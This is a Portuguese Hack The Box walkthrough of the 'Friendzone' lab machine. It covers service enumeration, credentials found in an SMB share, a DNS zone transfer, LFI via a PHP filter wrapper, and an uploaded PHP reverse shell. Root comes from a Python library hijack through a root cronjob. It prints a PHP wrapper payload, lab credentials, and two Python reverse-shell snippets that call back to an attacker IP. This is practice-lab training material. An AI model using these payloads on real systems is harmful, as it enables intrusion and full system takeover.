---
title: "Hack The Box - Friendzone"
tags: [Linux,Easy,Aquatone,Linpeas,DNS,PHP Wrapper,Wfuzz,Pspy]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/173>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 7 portas abertas

> Portas 80 e 443 -> Servidor Web

> Porta 53 -> DNS (possivelmente conseguimos fazer um DNS Reverso aqui, pois está aberto em TCP)

> Porta 21 -> FTP vsftpd 3.0.3

> Porta 22 -> SSH...

> Portas 139 e 445 -> Relativas a servidor samba

## Enumeração da porta 80 e 443

Abrindo a página verificamos o que tem nela (Porta 80)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_web.png)

Abrindo a página verificamos o que tem nela (Porta 443)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_web1.png)

Como de costume, sempre é bom termos rodando algum tipo de enumeração enquanto verificamos outras portas e serviços, pensando nisso vou deixar rodando um `Wfuzz` na porta 80 pra descobrir diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_wfuzz.png)

Nada de muito útil por enquanto nessa porta

Explicação Wfuzz:
> -c --> Exibir com cores

> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --> indicamos que o método será dicionário e o arquivo especificado

> --hc 404 --> Não vai exibir os arquivos que deram erro 404.

> -t 200 --> Quantidade de threads (pra ir mais rápido)

## Enumeração porta 21

Não conseguimos logar como anonymous

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_ftp.png)

## Enumeração porta 445

Começaremos com o `smbmap` para verificar quais pastas temos permissões dentro desse servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_smbmap.png)

Verificamos que temos acesso a algumas portas, vamos utilizar agora as flags -R e --depth 5, pra dizer que é recursivo até a profundidade de pastas 5

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_smbmap1.png)

Opa! Encontramos um arquivo chamado `creds.txt`, vamos baixar ele pra ver o que conseguimos de interessante

Para isso iremos utilizar o smbclient

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_smbclient.png)

Credenciais encontradas:

> admin:WORKWORKHhallelujah@#

## Enumeração porta 21 e 22 com esse login e senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_ftpssh.png)

## Enumeração porta 53

Uma vez que temos porta 53 aberta em TCP, podemos tentar reverse dns, mas antes se verificarmos no site que abriu, temos um domínio lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns.png)

Verificando no cerficado do HTTPS do 10.10.10.123 encontramos outro domínio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_cert.png)

Adicionamos eles ao /etc/hosts para ser resolvido

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns1.png)

Tentamos ver se tem algo diferente tanto em HTTP quanto HTTPS de ambos os domínio adicionados

### friendzoneportal.red

HTTP é igual

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns2.png)

HTTPS é diferente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns3.png)

Nada de diferente no código fonte das páginas também

### friendzone.red

HTTP é igual

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns4.png)

HTTPS é diferente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns5.png)

##### No código fonte do HTTPS do friendzone.red encontramos algo a ser verificado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns7.png)

##### Verificando do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_dns6.png)

Não faço a mínima ideia do que siginifica isso por enquanto, mas é algo a ser deixado guardado, pois no futuro será útil

## Realizaremos agora o DNS Reverso de ambas as páginas (Lembrando que temos a porta 53 TCP aberta, o que é um forte indício disso)

O comando é `dig axfr @ip domínio`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_rev.png)

Agora iremos colocar todos esses novos domínios encontrados dentro do nosso /etc/hosts

Primeiro passo é colocar todos ele em um arquivo mais palpável e somente o que me interessa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_rev1.png)

Pronto! Bem melhor agora, conseguimos tirar só o que interessa dos comandos, demora um tempinho pra pegar o jeito desses comandos de shell mas é o caso papirar por que poupa um tempo do caramba, agora vamos colocar todos eles em uma linha, pra ficar mais fácil de copiar e colar no /etc/hosts

Abrimos no *vi* e executamos esse comando e salvamos:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_rev2.png)

Ficará desse jeito:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_rev3.png)

Show, agora adicionamos no /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_rev4.png)

Pronto, agora vamos enumerar um a um na mão? Pô, lógico que não, daria pra fazer é claro mas ia demorar pra caramba e eu ia acabar me perdendo...

Irei utilizar a ferramenta `aquatone`, ele faz isso pra mim, verifica cada página e me traz as respostas que eu quero saber. Interessante, não?

### Usando o aquatone

Aqui está o GitHub dele

> https://github.com/michenriksen/aquatone

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq.png)

Clonamos ele na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq2.png)

Baixamos a release pq eu sou preguiçoso e não quero ter que fazer uma build dele

> https://github.com/michenriksen/aquatone/releases

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq1.png)

Agora utilizamos ele

Colocamos o https na frente da cada domínio encontrado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq3.png)

Rodamos o aquatone neles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq4.png)

Show, sucesso, agora abrimos o *aquatone_report.html* pra ver o que conseguimos 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_aq6.png)

*Resumo*

Portal de Login:

https://admin.friendzoneportal.red
https://administrator1.friendzone.red

*Uploads*

https://uploads.friendzone.red

Muito mais rápido, não?

# Exploração

### Logando na página

Tentamos login e conseguimos nesta

> admin:WORKWORKHhallelujah@#

> https://administrator1.friendzone.red

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_log.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_log1.png)

Vamos até /dashboard.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_log2.png)

Adicionamos o parâmetro que faltava e acessamos essa imagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_log3.png)

Huuum, pelo que percebi temos um LFI aqui. Podemos explorar mais ele agora.

### Explorando o LFI com PHP Wrapper

Fonte de consulta

> https://highon.coffee/blog/lfi-cheat-sheet/

*Iremos utilizar esse:*
PHP Wrapper
php://filter/convert.base64-encode/resource=login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_log5.png)

Convertemos base64 e comprovamos que temos um LFI

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_log4.png)

Relembrando lá do começo, quando enumeramos a porta 445, vimos que podemos escrever no diretório `Development`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_smbmap.png)

Sabendo que temos um LFI, também podemos executar arquivos .php no servidor, então será que se uparmos um webshell ai dentro e tentar executar pelo PHP Wrapper teremos sucesso? Vamos tentar, a ideia é boa.

### Explorando PHP Wrapper para conseguir WebShell

Primeira coisa é preparar nosso webshell, no caso eu utilizei um da máquina mesmo que já vem no Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_ws.png)

Alteramos o IP e Porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_ws1.png)

Upamos ele dentro da pasta Developmento do Samba

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_ws2.png)

Executamos (Aqui tiramos o .php, não sei pq com ele não deu) e ganhamos um shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_ws3.png)

### Escalação de Privilégio para Usuário Comum

Como primeiro passo de sempre devemos procurar por arquivos de configuração que possuam senhas que possamos utilizar para escalar privilégio

Dentro do /var/www encontramos umas credenciais de interesse

> db_user=friend

> db_pass=Agpyu12!0.213$

> db_name=FZ

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_sh.png)

Escalamos para o usuário `friend` uma vez que ele possui shell válido

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_sh2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_sh1.png)

# Escalação de Privilégio

Primeiro iremos rodar o Linpeas (por que eu gosto das cores dele)

Caso não tenha, aqui está o link dele

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_lin.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_lin1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_lin2.png)

De cara não encontramos nada de cor maneira pra escalar privilégio, mas encontramos algo útil, nos arquivos executados por todos, temos um tal de *os.py*, não é comum acharmos esse arquivo desse modo, então já cresce um pouco a importância de olharmos ele mais a fundo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_lin3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_lin4.png)

Ta, mas e daí? Podemos escrever nele mas não sabemos se é ou não executado, ai que entra a importância de termos outra ferramenta a nossa disposição, que é o `pspy`

#### Utilizando pspy

Para quem não sabe aqui está o link dele

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_pspy.png)

Passamos ele pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_pspy1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_pspy2.png)

E... surpresa, há um cronjob de root rodando esse report.py, agora ficou fácil pra caramba!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_pspy3.png)

Verificamos o que tem nesse report.py

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_pspy4.png)

Êpa, ele importa o mesmo os.py que podemos escrever, então se colocarmos nosso shell lá dentro, ele irá executar e nos dar um shell. Vamos lá então

#### Escalando pra root

O shell eu peguei do PentestMonkey

> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Arrumamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_py.png)

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.119",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```
Colocamos dentro do *os.py*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_py1.png)

Esperamos o cronjob rodar e teremos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_py2.png)

## Pegamos as flags de root e user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-friendzone/Fri_user.png)